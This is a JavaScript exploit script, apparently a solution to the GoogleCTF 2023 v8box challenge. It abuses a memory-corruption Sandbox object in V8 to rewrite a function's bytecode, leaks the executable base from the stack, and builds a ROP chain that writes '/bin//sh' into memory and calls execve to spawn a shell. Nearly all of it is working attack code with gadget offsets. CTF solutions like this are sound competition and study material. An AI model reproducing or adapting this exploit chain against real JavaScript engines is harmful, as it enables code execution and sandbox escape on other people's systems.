// based on my (@nneonneo) solution to GoogleCTF 2023 v8box
/* We will overwrite the bytecode of this function to do naughty things */
function explodeme() {
  // dummy constants to ensure we don't end up clobbering anything useful with the ropchain
  var a = 0.2;
  var b = 0.3;
  var c = 0.4;
  var d = 0.5;
  var e = 0.6;
  var f = 0.7;
  var g = 0.8;
  var h = 0.9;
  var i = 1.2;
  var j = 2.3;
  var k = 3.4;
  var l = 4.5;
  var m = 5.6;
  var n = 6.7;
  var o = 7.8;
  var p = 8.9;

  // Can breakpoint atan2 to debug without natives syntax enabled
  Math.atan2(a, b);
}

function write64(obj, idx, val) {
  obj[idx] = Number(val & 0xffffffffn);
  obj[idx+1] = Number(val >> 32n);
}

/* Call once to create bytecode */
explodeme(1);

/* Helpers, taking advantage of the memory corruption Sandbox object */
function addr2mem(addr, size) {
    let arr = new Sandbox.MemoryView(addr, size);
    return new Int32Array(arr);
}

function obj2mem(obj) {
    let addr = Sandbox.getAddressOf(obj);
    let size = Sandbox.getSizeOf(obj);
    return addr2mem(addr, size);
}

/* dig through the object hierarchy to find the bytecode */
let func_mem = obj2mem(explodeme);
console.log("SharedInfo:", func_mem[4].toString(16));
let sf_mem = addr2mem(func_mem[4] - 1, 0x100);
console.log("Bytecode object:", sf_mem[1].toString(16));
let bc_mem = addr2mem(sf_mem[1] - 1, 0x100);
console.log("Consts:", bc_mem[3].toString(16));
console.log("Bytecode sample:", bc_mem[9].toString(16));
let consts_mem = addr2mem(bc_mem[3] - 1, 0x100);
let first_const = consts_mem[2];
console.log("Constant 0:", consts_mem[2].toString(16));
// deliberately offset since we will write this directly to the stack
let const0_mem = addr2mem(consts_mem[2], 0x400);

// get an exe leak from here, but the low bits are not stable.
// we can get a precise leak of the low dword from the stack primitives
let fixed_obj = addr2mem(0x40000, 0x1000);

// Ldar/Star directly read/write the stack at a chosen int8 offset (multiplied by 8).
// We can therefore leak practically all of the stack (+/- 0x400 bytes), but we are
// constrained to reading the low 32 bits due to sandboxing

// leak exe address from return address
bc_mem[9] = 0xaa010b; // ldar +1; return

// Builtins_InterpreterEntryTrampoline+228, interpreted as an SMI
let exe_base = ((BigInt(explodeme(2)) & 0xffffffffn) << 1n) - 0x1593224n;
// Fill in the missing high bits using the heap addresses in 0x40000
exe_base += (BigInt(fixed_obj[17]) << 32n);
console.log("exe base:", exe_base.toString(16));

// Prepare a ropchain in sandboxed memory
var i = 2;
write64(const0_mem, i, exe_base + 0x000000000049ce4cn); i+=2; // 0x000000000049ce4c: pop rax; ret; 
write64(const0_mem, i, 0x68732f2f6e69622fn);            i+=2;
write64(const0_mem, i, exe_base + 0x00000000004f958dn); i+=2; // 0x00000000004f958d: pop rdi; ret; 
write64(const0_mem, i, exe_base + 0x00000000017a9000n); i+=2;
write64(const0_mem, i, exe_base + 0x0000000000c1ca77n); i+=2; // 0x0000000000c1ca77: mov qword ptr [rdi], rax; ret; 
write64(const0_mem, i, exe_base + 0x000000000049ce4cn); i+=2; // 0x000000000049ce4c: pop rax; ret; 
write64(const0_mem, i, 0x0n);                           i+=2;
write64(const0_mem, i, exe_base + 0x00000000004f958dn); i+=2; // 0x00000000004f958d: pop rdi; ret; 
write64(const0_mem, i, exe_base + 0x00000000017a9008n); i+=2;
write64(const0_mem, i, exe_base + 0x0000000000c1ca77n); i+=2; // 0x0000000000c1ca77: mov qword ptr [rdi], rax; ret; 
write64(const0_mem, i, exe_base + 0x00000000004f958dn); i+=2; // 0x00000000004f958d: pop rdi; ret; 
write64(const0_mem, i, exe_base + 0x00000000017a9000n); i+=2;
write64(const0_mem, i, exe_base + 0x00000000004f0c78n); i+=2; // 0x00000000004f0c78: pop rsi; ret; 
write64(const0_mem, i, exe_base + 0x00000000017a9008n); i+=2;
write64(const0_mem, i, exe_base + 0x00000000004cca6dn); i+=2; // 0x00000000004cca6d: pop rdx; ret; 
write64(const0_mem, i, exe_base + 0x00000000017a9008n); i+=2;
write64(const0_mem, i, exe_base + 0x000000000049ce4cn); i+=2; // 0x000000000049ce4c: pop rax; ret; 
write64(const0_mem, i, 0x3bn);                          i+=2;
write64(const0_mem, i, exe_base + 0x000000000055e818n); i+=2; // 0x000000000055e818: syscall; 

// Write sandboxed pointer to rbp+0x88 to kick off the ropchain (immediately before Builtins_JSEntry)
bc_mem[9] = 0x11180013; // load constant [0]; star +17; return
bc_mem[10] = 0xaa;

explodeme(2);
